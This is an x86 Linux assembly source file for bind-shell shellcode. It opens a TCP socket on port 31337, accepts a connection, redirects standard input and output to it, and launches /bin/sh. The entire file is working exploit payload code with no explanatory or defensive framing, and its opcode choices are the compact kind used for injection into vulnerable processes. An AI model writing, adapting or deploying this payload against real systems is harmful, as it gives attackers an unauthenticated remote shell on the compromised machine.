[BITS 32]

%define PORT 0x697a  			; (31337 in reverse)

; Syscalls
%define SYS_SOCKETCALL 0x66
%define SYS_DUP2 0x3f
%define SYS_EXECVE 0x0b
%define SYS_SOCKET 0x01
%define SYS_BIND 0x02
%define SYS_LISTEN 0x04
%define SYS_ACCEPT 0x05


%define PF_INET 0x02
%define AF_INET 0x02
%define SOCK_STREAM 0x01

	; EDX is mostly 0!
	xor edx, edx

	; int socketcall(int call, unsigned long *args)
	;	socketcall(SYS_SOCKET, [AF_INET, SOCK_STREAM, 0])
	push BYTE SYS_SOCKETCALL
	pop eax								; Set eax to SYS_SOCKETCALL
	push BYTE SYS_SOCKET
	pop ebx								; Set ebx to SYS_SOCKET
	xor ecx, ecx
	push ecx							; Push 0
	push BYTE SOCK_STREAM				; Push SOCK_STREAM
	push BYTE PF_INET					; Push PF_INET
	mov ecx, esp						; Save stack pointer as args pointer
	int 0x80
	xchg esi, eax						; Save eax for later


	; int socketcall(int call, unsigned long *args)
	;	socketcall(SYS_BIND, [AF_INET, PORT, 0], 16)
	push BYTE SYS_SOCKETCALL
	pop eax								; eax = SYS_SOCKETCALL
	push BYTE SYS_BIND
	pop ebx								; ebx = SYS_BIND
	push edx							;	0
	push WORD PORT						;	PORT (31337 in reverse)
	push BYTE AF_INET					;	AF_INET
	mov ecx, esp						; Save pointer to sock_addr
	push BYTE 0x10						;	16
	push ecx							; Pointer to args field
	push esi							; Socket fd
	mov ecx, esp						; ecx = arg field
	int 0x80							; eax = 0 on success


	; int socketcall(int call, unsigned long *args)
	;	socketcall(SYS_LISTEN, [sockfd, ebx])
	mov BYTE al, SYS_SOCKETCALL			; eax = SYS_SOCKETCALL
	mov BYTE bl, SYS_LISTEN				; ebx = SYS_LISTEN
	push ebx							;	4 (backlog = ebx. Whatever)
	push esi							;	sockfd
	mov ecx, esp						; ecx = esp
	int 0x80							; eax = 0 on success


	; int socketcall(int call, unsigned long *args)
	;	socketcall(SYS_ACCEPT, [sockfd, 0, 0])
	mov BYTE al, SYS_SOCKETCALL			; eax = SYS_SOCKETCALL
	mov BYTE bl, SYS_ACCEPT				; ebx = SYS_SOCKETCALL
	push edx							;	0
	push edx							;	0
	push esi							;	sockfd
	mov ecx, esp						; ecx = esp
	int 0x80							; eax != 0 on success


	; int dup2(int oldfd, int newfd)
	;	dup2(c, 0)	STDIN
	;	dup2(c, 1)	STDOUT
	;	dup2(c, 2)	STDERR
	mov ebx, eax						; ebx = client socket
	push BYTE 0x02
	pop ecx								; ecx = 2. Counter for our loop

dup_loop:
	push BYTE SYS_DUP2
	pop eax								; eax = SYS_DUP2
	int 0x80							; dup2(c, ecx)
	dec ecx								; decrement ecx. Sets Sign Flag (SF)
	jns dup_loop						; If SF not on


	; int execve(const char *filename,char *const argv[],char *const envp[])
	xor eax, eax
	mov al, SYS_EXECVE
	push edx
	push "n/sh"
	push "//bi"
	mov ebx, esp
	push edx
	mov edx, esp
	push ebx
	mov ecx, esp
	int 0x80
